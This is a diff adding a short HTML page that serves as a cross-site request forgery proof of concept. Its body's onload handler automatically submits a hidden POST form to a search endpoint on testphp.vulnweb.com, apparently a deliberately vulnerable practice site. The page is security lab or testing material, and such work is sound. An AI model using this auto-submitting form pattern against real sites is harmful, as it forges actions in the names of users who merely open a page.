@@ -1,0 +1,8 @@
+<!DOCTYPE html>
+<html>
+  <body onload="document.getElementById('csrfForm').submit()">
+    <form id="csrfForm" action="http://testphp.vulnweb.com/search.php" method="POST">
+      <input type="hidden" name="search" value="hacked">
+    </form>
+  </body>
+</html>
